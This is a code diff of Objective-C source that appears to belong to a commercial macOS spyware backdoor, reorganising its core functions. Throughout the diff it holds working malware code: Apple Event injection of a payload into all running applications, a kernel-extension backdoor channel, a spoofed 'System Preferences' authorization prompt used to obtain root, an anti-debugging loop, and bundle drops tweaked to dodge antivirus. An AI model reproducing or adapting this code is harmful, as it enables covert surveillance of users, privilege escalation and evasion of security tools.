@@ -120,6 +120,71 @@ io_registry_entry_t getRootDomain(void)
 //  return IORegistryEntrySetCFProperty(getRootDomain(), key, val);
 //}
 
+void lionSendEventToPid(pid_t pidP)
+{
+  AEEventID eventID = 'open';
+  int rUid = getuid();
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"send event to application pid %d", pidP);
+#endif
+  
+#ifdef DEBUG_CORE
+  infoLog(@"enter critical session [euid/uid %d/%d]", 
+          geteuid(), getuid());
+#endif
+  
+  // trimming process u&g
+  seteuid(rUid); 
+  
+  [app setTimeout:1];
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  [app sendEvent: kASAppleScriptSuite
+              id: kGetAEUT
+      parameters: 0];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
+#endif
+  
+  sleep(1);
+  
+  [app setTimeout:1];
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  
+  NSNumber *pid = [NSNumber numberWithInt: getpid()];
+  
+  id injectReply = [app sendEvent: 'OPNe'
+                               id: eventID
+                       parameters: 'pido', pid, 0];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"exit critical session [euid/uid %d/%d]", 
+          geteuid(), getuid());
+#endif
+  
+  if (injectReply != nil) 
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"injection done [%d]", pidP);
+#endif
+  }
+  
+  [pool release];  
+}
+
 //
 // Shutdown handler
 //
@@ -174,71 +239,6 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 }
 
-void lionSendEventToPid(pid_t pidP)
-{
-  AEEventID eventID = 'load';
-  int rUid = getuid();
-  
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-
-#ifdef DEBUG_CORE
-  infoLog(@"send event to application pid %d", pidP);
-#endif
-
-#ifdef DEBUG_CORE
-  infoLog(@"enter critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  // trimming process u&g
-  seteuid(rUid); 
-  
-  [app setTimeout:1];
-  
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  [app sendEvent: kASAppleScriptSuite
-              id: kGetAEUT
-      parameters: 0];
-      
-#ifdef DEBUG_CORE
-  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
-#endif
-
-  sleep(1);
-  
-  [app setTimeout:1];
-  
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
-  NSNumber *pid = [NSNumber numberWithInt: getpid()];
-
-  id injectReply = [app sendEvent: 'RCSe'
-                               id: eventID
-                       parameters: 'pido', pid, 0];
-
-#ifdef DEBUG_CORE
-  infoLog(@"exit critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  if (injectReply != nil) 
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
-#endif
-    }
-  else 
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"injection done [%d]", pidP);
-#endif
-    }
-
-  [pool release];  
-}
-
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
@@ -253,6 +253,12 @@ void lionSendEventToPid(pid_t pidP)
 - (void)_checkSystemLog;
 
 //
+// Main thread
+//
+- (void)_communicateWithAgents;
+
+//
+//
 // Speex encode and write to logs
 // shouldn't be here but needs access to logManager
 //
@@ -261,12 +267,6 @@ void lionSendEventToPid(pid_t pidP)
                   channels: (u_int)channels
                   forInput: (BOOL)isInput;
 
-//
-// Main thread
-//
-- (void)_communicateWithAgents;
-
-//
 // Guess all the required names before the backdoor starts
 //
 - (void)_guessNames;
@@ -274,27 +274,27 @@ void lionSendEventToPid(pid_t pidP)
 //
 // Build the internal app folders and plist files needed to execute the backdoor
 //
-- (void)_createInternalFilesAndFolders;
-
 - (void)_resizeSharedMemoryWindow;
 
-- (BOOL)_createAndInitSharedMemory;
+- (void)_createInternalFilesAndFolders;
 
 - (void)_checkForOthers;
 
-- (BOOL)_SLIEscalation;
+- (BOOL)_createAndInitSharedMemory;
 
-- (BOOL)_UISpoof;
+- (BOOL)_SLIEscalation;
 
 - (BOOL)_dropInputManager;
 
-- (void)_solveKernelSymbolsForKext;
+- (BOOL)_UISpoof;
 
 - (void)_dropOsaxBundle;
 
-- (void)_dropXPCBundle;
+- (void)_solveKernelSymbolsForKext;
 
 - (void)_registerForShutdownNotifications;
+
+- (void)_dropXPCBundle;
 
 @end
 
@@ -2338,7 +2338,7 @@ void lionSendEventToPid(pid_t pidP)
   
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
 
-  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
+  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"_place_on_" 
                                                               withString: gInputManagerName];
 
   NSString *infoPath = [NSString stringWithFormat:
@@ -2354,7 +2354,7 @@ void lionSendEventToPid(pid_t pidP)
   [info_pl release];
   [info_orig_pl release];
   
-  NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
+  NSString *resource_r = [[NSString alloc] initWithCString: inputManager_r];
   
   NSString *rPath = [NSString stringWithFormat:
                      @"%@/%@/Contents/Resources/appleOsax.r",
@@ -2843,7 +2843,6 @@ void lionSendEventToPid(pid_t pidP)
 @synthesize mSpoofedName;
 @synthesize mMainLoopControlFlag;
 
-
 - (id)init
 {
   self = [super init];
@@ -2924,6 +2923,237 @@ void lionSendEventToPid(pid_t pidP)
     }
   
   [super dealloc];
+}
+
+- (int)connectKext
+{
+#ifdef DEBUG_CORE
+  infoLog(@"Initializing backdoor with kext");
+#endif
+  
+  gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
+  
+  if (gBackdoorFD != -1) 
+  {
+    int ret;//, bID;
+    
+    
+    ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
+    if (ret < 0)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error while initializing the uspace-kspace "\
+               "communication channel");
+#endif
+      
+      return -1;
+    }
+    else
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"Backdoor initialized correctly");
+#endif
+    }
+  }
+  else
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error while opening the KEXT dev entry!");
+#endif
+    
+    return -1;
+  }
+  
+  return 0;
+}
+
+- (void)sendEventToPid: (NSNumber *)thePid
+{
+  AEEventID eventID = 'open';
+  int eUid = geteuid();
+  int rUid = getuid();
+  int maxRetry = 10;
+  
+  if (thePid == nil)
+    return;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // On lion fork to sendEvents without problem
+  if ([gUtil isLion]) 
+  {
+    NSTask *aTask = [[NSTask alloc] init];
+    NSMutableArray *args = [NSMutableArray array];
+    NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
+    
+    //argv
+    [args addObject: @"-p"];
+    [args addObject: pidStr];
+    [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
+    [aTask setArguments:args];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"Running task with args %@", args);
+#endif
+    
+    [aTask launch];
+    [aTask release];
+    [pidStr release];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"task launched");
+#endif
+    return;
+  }
+  
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
+  
+  [gControlFlagLock lock];
+  NSString *localFlag = [_taskManager getControlFlag];
+  [gControlFlagLock unlock];
+  
+  if ([localFlag isEqualToString: @"STOP"])
+  {
+    return;
+  }
+  
+  pid_t pidP = (pid_t) [thePid intValue];
+  
+  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"send event to application pid %d", pidP);
+#endif
+  
+  [gSuidLock lock];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  // trimming process u&g
+  if (eUid != rUid)
+    seteuid(rUid);
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  [app sendEvent: kASAppleScriptSuite
+              id: kGetAEUT
+      parameters: 0];
+  
+  sleep(1);
+  
+  
+  NSNumber *pid = [NSNumber numberWithInt: getpid()];
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  id injectReply = [app sendEvent: 'OPNe'
+                               id: eventID
+                       parameters: 'pido', pid, 0];
+  
+  // Check if the seteuid do the correct work...
+  while ((geteuid() != eUid) && maxRetry--) 
+  {
+    // original u&g
+    if (seteuid(eUid) == -1)
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"setting euid error [%d]", 
+              errno);
+#endif
+    }
+    
+    usleep(500);
+  }
+  
+  [gSuidLock unlock];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  if (injectReply != nil) 
+  {
+#ifdef DEBUG_CORE	
+    warnLog(@"unexpected injectReply: %@", injectReply);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG_CORE
+    verboseLog(@"injection done");
+#endif
+  }
+  
+  [pool release];  
+}
+
+- (void)injectRunningApp
+{
+  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
+  
+  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
+  
+  NSArray *apps = [ws runningApplications];
+  
+  if (apps && [apps count]) 
+  {
+    for (int i=0; i<[apps count]; i++) 
+    {
+      NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
+      
+      pid_t tmpPid = [app processIdentifier];
+      
+      NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+      
+#ifdef DEBUG_CORE_
+      infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
+              [app localizedName], [app processIdentifier]);
+#endif
+      [self sendEventToPid:thePid]; 
+      
+      [thePid release];
+      
+      usleep(500);
+    }
+  }
+  
+  [pool release];
+}
+
+- (void)checkAndRunDemoMode
+{
+  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
+  
+  // FIXED- demo mode
+  if ([appName isEqualToString: @"System Preferences"] == FALSE)
+  {
+    // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
+    char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+    "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+    
+    NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
+    
+    NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
+    
+    NSMutableData *currDemoMode = [demoMode sha1Hash];
+    
+    if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
+    {
+      NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                            [[NSBundle mainBundle] bundlePath],
+                            @"infected.bmp"];
+      
+      changeDesktopBg(filePath, NO);
+      
+      gIsDemoMode = YES;
+      
+      [filePath release];
+    }    
+  }
 }
 
 - (BOOL)makeBackdoorResident
@@ -3010,38 +3240,6 @@ void lionSendEventToPid(pid_t pidP)
     }
       
   return TRUE;
-}
-
-- (void)checkAndRunDemoMode
-{
-  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
-  
-  // FIXED- demo mode
-  if ([appName isEqualToString: @"System Preferences"] == FALSE)
-    {
-      // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
-      char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
-                        "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
-      
-      NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
-      
-      NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
-      
-      NSMutableData *currDemoMode = [demoMode sha1Hash];
-      
-      if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
-        {
-          NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                                                                 [[NSBundle mainBundle] bundlePath],
-                                                                 @"infected.bmp"];
-          
-          changeDesktopBg(filePath, NO);
-          
-          gIsDemoMode = YES;
-          
-          [filePath release];
-      }    
-    }
 }
 
 - (BOOL)runMeh
@@ -3201,11 +3399,12 @@ void lionSendEventToPid(pid_t pidP)
 
       [self _dropOsaxBundle];
       
-      // Drop xpc services for sandboxed app
-      if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
-        {
-          [self _dropXPCBundle];
-        }
+    //XXX- for av problem
+//      // Drop xpc services for sandboxed app
+//      if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
+//        {
+//          [self _dropXPCBundle];
+//        }
     }
 
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
@@ -3400,178 +3599,6 @@ void lionSendEventToPid(pid_t pidP)
   return YES;
 }
 
-- (void)sendEventToPid: (NSNumber *)thePid
-{
-  AEEventID eventID = 'load';
-  int eUid = geteuid();
-  int rUid = getuid();
-  int maxRetry = 10;
-
-  if (thePid == nil)
-    return;
-
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
-  // On lion fork to sendEvents without problem
-  if ([gUtil isLion]) 
-    {
-      NSTask *aTask = [[NSTask alloc] init];
-      NSMutableArray *args = [NSMutableArray array];
-      NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
-
-      //argv
-      [args addObject: @"-p"];
-      [args addObject: pidStr];
-      [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
-      [aTask setArguments:args];
-
-#ifdef DEBUG_CORE
-      verboseLog(@"Running task with args %@", args);
-#endif
-
-      [aTask launch];
-      [aTask release];
-      [pidStr release];
-      
-#ifdef DEBUG_CORE
-      verboseLog(@"task launched");
-#endif
-      return;
-    }
-
-  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
-
-  [gControlFlagLock lock];
-  NSString *localFlag = [_taskManager getControlFlag];
-  [gControlFlagLock unlock];
-
-  if ([localFlag isEqualToString: @"STOP"])
-    {
-      return;
-    }
-
-  pid_t pidP = (pid_t) [thePid intValue];
-
-  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"send event to application pid %d", pidP);
-#endif
-
-  [gSuidLock lock];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"enter critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  // trimming process u&g
-  if (eUid != rUid)
-    seteuid(rUid);
-
-  [app setTimeout: 1];
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  [app sendEvent: kASAppleScriptSuite
-              id: kGetAEUT
-      parameters: 0];
-
-  sleep(1);
-
-  
-  NSNumber *pid = [NSNumber numberWithInt: getpid()];
-  
-  [app setTimeout: 1];
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  id injectReply = [app sendEvent: 'RCSe'
-                               id: eventID
-                       parameters: 'pido', pid, 0];
-
-  // Check if the seteuid do the correct work...
-  while ((geteuid() != eUid) && maxRetry--) 
-    {
-      // original u&g
-      if (seteuid(eUid) == -1)
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"setting euid error [%d]", 
-                  errno);
-#endif
-        }
-
-      usleep(500);
-    }
-
-  [gSuidLock unlock];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"exit critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  if (injectReply != nil) 
-    {
-#ifdef DEBUG_CORE	
-      warnLog(@"unexpected injectReply: %@", injectReply);
-#endif
-    }
-  else 
-    {
-#ifdef DEBUG_CORE
-      verboseLog(@"injection done");
-#endif
-    }
-
-  [pool release];  
-}
-
-- (void)injectRunningApp
-{
-  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-  
-  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
-  
-  NSArray *apps = [ws runningApplications];
-  
-  if (apps && [apps count]) 
-    {
-      for (int i=0; i<[apps count]; i++) 
-        {
-          NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
-          
-          pid_t tmpPid = [app processIdentifier];
-          
-          NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
-          
-#ifdef DEBUG_CORE_
-        infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
-              [app localizedName], [app processIdentifier]);
-#endif
-          [self sendEventToPid:thePid]; 
-          
-          [thePid release];
-          
-          usleep(500);
-        }
-    }
-    
-  [pool release];
-}
-
-- (BOOL)isCrisisHookApp: (NSString*)appName
-{
-  if (gAgentCrisisApp == nil)
-    return NO;
-  
-  for (int i=0; i<[gAgentCrisisApp count]; i++) 
-  {
-    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
-    if ([appName isCaseInsensitiveLike: tmpAppName])
-      return YES;
-  }
-  
-  return NO;
-}
-
 - (BOOL)isCrisisNetApp: (NSString*)appName
 {
   if (gAgentCrisisNet == nil)
@@ -3600,14 +3627,29 @@ void lionSendEventToPid(pid_t pidP)
   if ((gAgentCrisis & CRISIS_SYNC) &&
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
   {
-
+    
     gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
 #ifdef DEBUG_CORE
     infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
 #endif
   }
-    
+  
   [pool release];
+}
+
+- (BOOL)isCrisisHookApp: (NSString*)appName
+{
+  if (gAgentCrisisApp == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisApp count]; i++) 
+  {
+    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
 }
 
 - (void)injectBundle: (NSNotification*)notification
@@ -3710,46 +3752,289 @@ void lionSendEventToPid(pid_t pidP)
   [pool release];
 }
 
-- (int)connectKext
+- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized
 {
+  AuthorizationRef myAuthorizationRef;
+  
+  OSStatus myStatus;
+  FILE *myCommunicationsPipe  = NULL;
+  NSString *execPath          = nil;
+  
+  //AuthorizationExternalForm extAuth;
+  char myReadBuffer[256];
+  
+  //
+  // ExtendRights here is used in order to do the infamous sudo
+  //
+  AuthorizationFlags myFlags = kAuthorizationFlagDefaults
+  | kAuthorizationFlagInteractionAllowed
+  //| kAuthorizationFlagPreAuthorize
+  | kAuthorizationFlagExtendRights;
+  
+  //
+  // Looks like icns files don't work here .. Only tif(f) atm
+  //
+  NSString *iconDestinationPath = [[[[[[NSBundle mainBundle] bundlePath]
+                                      stringByDeletingLastPathComponent]
+                                     stringByDeletingLastPathComponent]
+                                    stringByDeletingLastPathComponent]
+                                   stringByAppendingPathComponent: @"_sys.tiff"];
+  
+  NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
+                               stringByAppendingPathComponent: ICON_FILENAME];
+  
+  // If we're authorized we can execute now our backdoor properly
+  if (amIAlreadyAuthorized == YES)
+  {
 #ifdef DEBUG_CORE
-  infoLog(@"Initializing backdoor with kext");
+    infoLog(@"Already authorized, relaunching the original file");
 #endif
-  
-  gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
-  
-  if (gBackdoorFD != -1) 
+    
+    NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
+                               [[NSBundle mainBundle] bundlePath]];
+    
+    NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+    [searchPattern release];
+    
+    [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                               error: nil];
+    
+    if ([_searchedFile count] > 0)
     {
-      int ret;//, bID;
-      
-      
-      ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
-      if (ret < 0)
-        {
+      execPath = [[_searchedFile objectAtIndex: 0]
+                  stringByReplacingOccurrencesOfString: @".ez"
+                  withString: @""];
 #ifdef DEBUG_CORE
-          errorLog(@"Error while initializing the uspace-kspace "\
-                     "communication channel");
+      infoLog(@"execPath: %@", execPath);
 #endif
-          
-          return -1;
-        }
+    }
+    else
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"ez file not found");
+#endif
+      exit(-1);
+    }    
+  }
+  
+  [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
+                                          toPath: iconDestinationPath
+                                           error: nil];
+  
+  //
+  // Looks like the common practice is to split the AuthorizationItem Rights
+  // from the AuthorizationItem Environment since we need to pass 2 different
+  // objects later on while calling AuthorizationCopyRights
+  //
+  AuthorizationItem myItems;
+  myItems.name         = kAuthorizationRightExecute; // system.privilege.admin
+  myItems.valueLength  = 0;
+  myItems.value        = NULL;
+  myItems.flags        = 0;
+  
+  //
+  // Authentication Icon
+  //
+  AuthorizationItem myAuthItems;
+  myAuthItems.name          = kAuthorizationEnvironmentIcon;
+  myAuthItems.valueLength   = strlen((char *)[iconDestinationPath UTF8String]);
+  myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
+  myAuthItems.flags         = 0;
+  
+  AuthorizationRights myRights;
+  myRights.count = 1;
+  myRights.items = &myItems;
+  
+  AuthorizationEnvironment authEnvironment;
+  authEnvironment.count = 1;
+  authEnvironment.items = &myAuthItems;
+  
+#ifdef DEBUG_CORE
+  infoLog(@"Creating authorization");
+#endif
+  
+  //
+  // Create an empty auth ref to fill later
+  //
+  myStatus = AuthorizationCreate(&myRights,
+                                 //kAuthorizationEmptyEnvironment,
+                                 &authEnvironment,
+                                 myFlags,
+                                 &myAuthorizationRef);
+  
+  //
+  // errAuthorizationSuccess returned in case of success
+  //
+  if (myStatus != errAuthorizationSuccess)
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error while creating the empty Authorization Reference");
+#endif
+    //return myStatus;
+  }
+  /*
+   myStatus = AuthorizationCopyRights(myAuthorizationRef,
+   &myRights,
+   //kAuthorizationEmptyEnvironment,
+   &authEnvironment,
+   myFlags,
+   NULL);
+   
+   if (myStatus != errAuthorizationSuccess)
+   {
+   #ifdef DEBUG_UI_SPOOF
+   errorLog(@"[EE] Error while authorizing the user");
+   #endif
+   
+   [self _createInternalFilesAndFolders];
+   
+   //
+   // Only perform SLI escalation on 10.5 since it doesn't seem to work
+   // on 10.6
+   //
+   if (gOSMajor == 10 && gOSMinor == 5)
+   {
+   if ([self getRootThroughSLI] == YES)
+   {
+   #ifdef DEBUG_CORE
+   warnLog(@"Err on auth, switching to SLI PLIST mode");
+   #endif
+   [gUtil dropExecFlag];
+   }
+   }
+   
+   [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+   error: nil];
+   
+   exit(-1);
+   }*/
+  /*  
+   //
+   // Turn an AuthorizationRef into an external "byte blob" form so it can be
+   // passed over the authenticated execution
+   //
+   myStatus = AuthorizationMakeExternalForm(myAuthorizationRef, &extAuth);
+   if (myStatus != errAuthorizationSuccess)
+   {
+   #ifdef DEBUG_UI_SPOOF
+   errorLog(@"Unable to turn the AuthorizationRef into external form");
+   #endif
+   }*/
+  
+  if (execPath == nil)
+  {
+    if ([gUtil isLeopard])
+    {
+      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
+                                 [[NSBundle mainBundle] bundlePath]];
+      
+      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+      [searchPattern release];
+      
+      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                                 error: nil];
+      
+      if ([_searchedFile count] > 0)
+      {
+        execPath = [[_searchedFile objectAtIndex: 0]
+                    stringByReplacingOccurrencesOfString: @".ez"
+                    withString: @""];
+      }
       else
-        {
+      {
 #ifdef DEBUG_CORE
-          infoLog(@"Backdoor initialized correctly");
+        errorLog(@"ez file not found");
 #endif
-        }
+        exit(-1);
+      }
     }
-  else
+    else
     {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while opening the KEXT dev entry!");
-#endif
-      
-      return -1;
+      execPath = [NSString stringWithFormat: @"%@",
+                  [[[NSBundle mainBundle] bundlePath]
+                   stringByAppendingPathComponent: @"System Preferences"]];
     }
+  }
   
-  return 0;
+#ifdef DEBUG_CORE
+  infoLog(@"Executing with auth (%@)", execPath);
+#endif
+  
+  myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
+                                                (char *)[execPath UTF8String],
+                                                kAuthorizationFlagDefaults,
+                                                nil,
+                                                &myCommunicationsPipe);
+  
+  if (myStatus != errAuthorizationSuccess)
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error on last step");
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"Auth executed with success (%s)", myReadBuffer);
+#endif
+    read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
+    fclose(myCommunicationsPipe);
+  }
+  
+  [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                             error: nil];
+  
+  //
+  // Free the AuthorizationRef
+  //
+  AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
+  
+#ifdef DEBUG_CORE
+  warnLog(@"Quitting from auth");
+#endif
+  
+  exit(0);
+}
+
+//
+// See http://developer.apple.com/qa/qa2004/qa1361.html
+//
+- (void)xfrth
+{
+  while (true)
+  {
+    int                 junk;
+    int                 mib[4];
+    struct kinfo_proc   info;
+    size_t              size;
+    
+    //
+    // Initialize the flags so that, if sysctl fails for some bizarre
+    // reason, we get a predictable result.
+    //
+    info.kp_proc.p_flag = 0;
+    
+    //
+    // Initialize mib, which tells sysctl the info we want, in this case
+    // we're looking for information about a specific process ID. 
+    //
+    mib[0] = CTL_KERN;
+    mib[1] = KERN_PROC;
+    mib[2] = KERN_PROC_PID;
+    mib[3] = getpid();
+    
+    // Call sysctl
+    size = sizeof(info);
+    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
+    
+    // We're being debugged if the P_TRACED flag is set
+    if ((info.kp_proc.p_flag & P_TRACED) != 0)
+    {
+      exit(-1);
+    }
+    
+    usleep(50000);
+  }
 }
 
 - (BOOL)getRootThroughSLI
@@ -3848,289 +4133,5 @@ void lionSendEventToPid(pid_t pidP)
   return YES;
 }
 
-- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized
-{
-  AuthorizationRef myAuthorizationRef;
-  
-  OSStatus myStatus;
-  FILE *myCommunicationsPipe  = NULL;
-  NSString *execPath          = nil;
-  
-  //AuthorizationExternalForm extAuth;
-  char myReadBuffer[256];
-  
-  //
-  // ExtendRights here is used in order to do the infamous sudo
-  //
-  AuthorizationFlags myFlags = kAuthorizationFlagDefaults
-                                | kAuthorizationFlagInteractionAllowed
-                                //| kAuthorizationFlagPreAuthorize
-                                | kAuthorizationFlagExtendRights;
-  
-  //
-  // Looks like icns files don't work here .. Only tif(f) atm
-  //
-  NSString *iconDestinationPath = [[[[[[NSBundle mainBundle] bundlePath]
-                                      stringByDeletingLastPathComponent]
-                                     stringByDeletingLastPathComponent]
-                                    stringByDeletingLastPathComponent]
-                                   stringByAppendingPathComponent: @"_sys.tiff"];
-  
-  NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
-                               stringByAppendingPathComponent: ICON_FILENAME];
-
-  // If we're authorized we can execute now our backdoor properly
-  if (amIAlreadyAuthorized == YES)
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Already authorized, relaunching the original file");
-#endif
-    
-      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
-                                 [[NSBundle mainBundle] bundlePath]];
-      
-      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
-      [searchPattern release];
-      
-      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                 error: nil];
-      
-      if ([_searchedFile count] > 0)
-        {
-          execPath = [[_searchedFile objectAtIndex: 0]
-                      stringByReplacingOccurrencesOfString: @".ez"
-                      withString: @""];
-#ifdef DEBUG_CORE
-          infoLog(@"execPath: %@", execPath);
-#endif
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          errorLog(@"ez file not found");
-#endif
-          exit(-1);
-        }    
-    }
-    
-  [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
-                                          toPath: iconDestinationPath
-                                           error: nil];
-  
-  //
-  // Looks like the common practice is to split the AuthorizationItem Rights
-  // from the AuthorizationItem Environment since we need to pass 2 different
-  // objects later on while calling AuthorizationCopyRights
-  //
-  AuthorizationItem myItems;
-  myItems.name         = kAuthorizationRightExecute; // system.privilege.admin
-  myItems.valueLength  = 0;
-  myItems.value        = NULL;
-  myItems.flags        = 0;
-  
-  //
-  // Authentication Icon
-  //
-  AuthorizationItem myAuthItems;
-  myAuthItems.name          = kAuthorizationEnvironmentIcon;
-  myAuthItems.valueLength   = strlen((char *)[iconDestinationPath UTF8String]);
-  myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
-  myAuthItems.flags         = 0;
-  
-  AuthorizationRights myRights;
-  myRights.count = 1;
-  myRights.items = &myItems;
-  
-  AuthorizationEnvironment authEnvironment;
-  authEnvironment.count = 1;
-  authEnvironment.items = &myAuthItems;
-  
-#ifdef DEBUG_CORE
-  infoLog(@"Creating authorization");
-#endif
-  
-  //
